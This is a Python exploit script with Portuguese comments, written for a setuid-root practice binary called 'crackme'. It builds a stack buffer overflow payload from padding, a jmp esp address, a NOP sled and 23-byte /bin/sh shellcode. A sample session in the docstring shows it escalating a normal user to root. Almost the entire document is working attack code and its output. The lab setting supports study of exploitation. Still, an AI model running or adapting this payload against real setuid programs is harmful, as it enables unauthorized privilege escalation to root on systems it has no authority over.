'''
Exploit para CrackMe.c
----------------------
Este exploit gera um Buffer Overflow no programinha crackme,
possibilitando executar o shellcode que chama uma /bin/sh.
O programa crackme roda com suidbit ligado como root.
Conseguir uma shell por aqui nos da acesso de administrador
no sistema :)

OBS: Pode ser que exploit nao retorne uma shell logo na
primeira tentativa. Execute varias vezes seguidas, se for
o caso, ateh retornar o #

Exemplo:

user@virtual:~$ whoami
user
user@virtual:~$ python exploit.py
AAAAAAAAAAAAAAAAAAAAA...f8490909090...1ÀPh//shh/bin89ãPS89á°♂̀
Opa, o valor de arg1 foi sobreescrito para: 0x622f6868
# whoami
root
#

---
Ivan S. Vargas | contato@is5.com.br
11/2017
'''
import os

#shellcode /bin/sh com apenas 23 bytes!
shellcode = ""
shellcode += "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f"
shellcode += "\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0"
shellcode += "\x0b\xcd\x80"

#o crackme tem um funcao que executa um jmp $esp
#aki especificamos o endereco dessa funcao 
#obtido com gdb$ info functions
JMP_ESP = "\x66\x84\x04\x08" #0x08048466

#o sistema quebra com 52 bytes
#o EIP eh escrito a partir do byte 20

PAYLOAD = "A" * 20 + JMP_ESP + "\x90" * (52 - 20 - 4 - len(shellcode)) + shellcode

CMD = "./crackme " + PAYLOAD

os.system(CMD)

